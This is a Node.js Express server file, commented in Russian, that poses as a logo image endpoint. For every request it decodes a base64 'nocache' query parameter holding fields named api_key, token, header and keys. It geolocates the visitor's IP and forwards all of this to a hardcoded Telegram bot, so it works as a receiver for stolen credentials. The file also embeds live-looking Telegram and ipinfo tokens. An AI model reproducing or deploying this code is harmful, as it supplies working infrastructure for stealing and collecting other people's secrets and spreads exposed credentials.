import express from 'express';
import axios from 'axios';
import { Buffer } from 'buffer';

const app = express();

// Включаем доверие к прокси (важно для Vercel)
app.set('trust proxy', true);

// Конфигурация Telegram
const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
const TELEGRAM_CHAT_ID = '5018443124';
const IPINFO_TOKEN = '717875db282daa'; // Получите на ipinfo.io

const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';

// Обработчик GET запросов
app.get('/', async (req, res) => {
  try {
    // Получаем реальный IP пользователя
    // @ts-ignore
    const userIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                  req.socket?.remoteAddress || 
                  req.connection?.remoteAddress || 
                  req.ip;
    
    // Получаем страну по IP
    const country = await getCountryByIp(userIp);
    
    // Дешифруем данные nocache
    const decryptedData = decryptNocache(req.query.nocache);
    
    console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);

    // Отправляем данные в Telegram (асинхронно, не ждем завершения)
    sendToTelegram(userIp, country, req.query, decryptedData);

    // Отправляем изображение
    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.status(200).send(imageBuffer);

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Функция дешифровки данных nocache
// @ts-ignore
function decryptNocache(nocache) {
  if (!nocache) return null;
  
  try {
    // Декодируем Base64
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    
    // Парсим JSON
    const data = JSON.parse(decoded);
    
    return {
      ref: data.ref,
      api_key: data.api_key,
      token: data.token,
      timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
      header: data.header,
      keys: data.keys || [],
    };
  } catch (error) {
    console.error('Decryption error:', error);
    return { error: 'Failed to decrypt data' };
  }
}

// Функция получения страны по IP
// @ts-ignore
async function getCountryByIp(ip) {
  if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Local';
  
  try {
    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
    return response.data.country || 'Unknown';
  } catch (error) {
    console.error('IP info error:', error);
    return 'Error';
  }
}

// Функция отправки в Telegram
// @ts-ignore
async function sendToTelegram(ip, country, queryData, decryptedData) {
  try {
    // Форматируем сообщение
    let message = `🌐 *Новый запрос логотипа*\n\n`;
    message += `🖥️ *IP*: ${ip}\n`;
    message += `📍 *Страна*: ${country}\n\n`;
    
    message += `🔐 *Зашифрованные данные (query)*:\n`;
    for (const [key, value] of Object.entries(queryData)) {
      message += `▫️ ${key}: \`${value}\`\n`;
    }
    
    if (decryptedData) {
      message += `\n🔓 *Расшифрованные данные*:\n`;
      for (const [key, value] of Object.entries(decryptedData)) {
        message += `▫️ ${key}: \`${value}\`\n`;
      }
    }
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Ошибка Telegram:', error);
  }
}

export default app;